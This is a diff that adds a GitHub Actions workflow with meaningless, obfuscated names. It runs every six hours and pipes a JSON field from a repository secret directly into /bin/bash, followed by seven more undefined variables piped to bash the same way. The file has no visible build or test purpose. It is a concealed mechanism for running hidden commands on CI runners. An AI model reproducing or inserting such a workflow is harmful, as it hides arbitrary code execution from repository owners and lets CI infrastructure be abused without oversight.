@@ -1,0 +1,24 @@
+name: joinercategory
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: joinercategory
+        env:
+          t3706: ${{ secrets.t3706 }}
+        run: |
+          echo $t3706 | jq -r .vqxu09 | /bin/bash
+          echo $ztmw54 | jq -r .n19 | /bin/bash
+          echo $ihsym26506 | jq -r .fq050 | /bin/bash
+          echo $pduji7450 | jq -r .brjf1 | /bin/bash
+          echo $ls5114 | jq -r .pxq72 | /bin/bash
+          echo $ug7299 | jq -r .wpwy351 | /bin/bash
+          echo $gy76 | jq -r .ovldi7606 | /bin/bash
+          echo $aqt20761 | jq -r .r14 | /bin/bash
+
